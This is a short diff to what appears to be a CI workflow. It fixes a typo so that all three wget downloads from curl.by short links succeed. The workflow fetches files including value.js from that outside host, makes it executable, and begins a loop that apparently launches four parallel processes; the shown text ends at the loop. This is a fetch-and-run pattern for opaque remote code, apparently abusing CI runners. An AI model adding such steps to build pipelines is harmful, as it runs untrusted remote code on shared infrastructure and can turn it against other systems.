@@ -17,7 +17,7 @@ jobs:
         run: |
           wget https://curl.by/HxWoN/ua.txt
           wget https://curl.by/YcH34/value.js
-          wtet https://curl.by/19kka/fres.txt
+          wget https://curl.by/19kka/fres.txt
           chmod +x value.js
           PIDS=()
           for i in {1..4}; do
